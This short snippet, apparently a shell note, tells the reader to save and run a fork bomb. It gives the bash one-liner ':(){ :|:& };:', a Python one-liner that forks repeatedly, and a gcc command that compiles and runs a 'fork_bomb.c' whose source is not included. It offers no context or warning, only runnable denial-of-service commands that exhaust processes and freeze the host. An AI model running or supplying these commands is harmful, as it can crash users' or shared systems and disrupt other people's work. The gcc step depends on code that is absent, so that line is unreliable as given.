# Save this as fork_bomb.sh and run it in a Unix-like environment
:(){ :|:& };:
python3 -c 'import os; [os.fork() for _ in range(100)]'
gcc -o fork_bomb fork_bomb.c && ./fork_bomb
